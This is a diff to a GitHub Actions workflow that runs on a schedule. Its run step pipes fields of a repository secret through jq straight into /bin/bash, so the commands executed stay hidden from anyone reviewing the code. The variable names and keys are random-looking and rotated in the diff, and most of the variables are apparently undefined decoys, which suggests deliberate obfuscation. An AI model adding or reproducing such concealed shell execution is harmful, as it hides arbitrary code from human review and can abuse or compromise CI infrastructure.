@@ -3,27 +3,26 @@ name: guoxiagjiaokai
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
-
+    - cron: '52 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoxiagjiaokai
         env:
-          fb8575: ${{ secrets.fb8575 }}
+          co87753: ${{ secrets.co87753 }}
         run: |
-          echo $fb8575 | jq -r .ec96017 | /bin/bash
-          echo $ma93 | jq -r .kqn50 | /bin/bash
-          echo $g05 | jq -r .gynz1 | /bin/bash
-          echo $oltib4 | jq -r .krcl1990 | /bin/bash
-          echo $zsplt896 | jq -r .qteal28 | /bin/bash
-          echo $gmh8 | jq -r .nl21175 | /bin/bash
-          echo $aa6985 | jq -r .jmk436 | /bin/bash
-          echo $oz65095 | jq -r .f977 | /bin/bash
-          echo $was1915 | jq -r .f150 | /bin/bash
-          echo $mdz799 | jq -r .ohcp97 | /bin/bash
-          echo $onhcs34 | jq -r .znw66 | /bin/bash
+          echo $co87753 | jq -r .ohlu43 | /bin/bash
+          echo $gs53045 | jq -r .fulkb07 | /bin/bash
+          echo $tzry436 | jq -r .uq16498 | /bin/bash
+          echo $ti999 | jq -r .e507 | /bin/bash
+          echo $oyph5 | jq -r .yn00703 | /bin/bash
+          echo $zztzg5 | jq -r .wttci673 | /bin/bash
+          echo $zwl815 | jq -r .oji4 | /bin/bash
+          echo $cdo9 | jq -r .rqnpr84 | /bin/bash
+          echo $sjby0672 | jq -r .wpgk46 | /bin/bash
+          echo $fn90160 | jq -r .db6399 | /bin/bash
+          echo $z133 | jq -r .pbc797 | /bin/bash
+          echo $rzc2023 | jq -r .qsp23 | /bin/bash
 
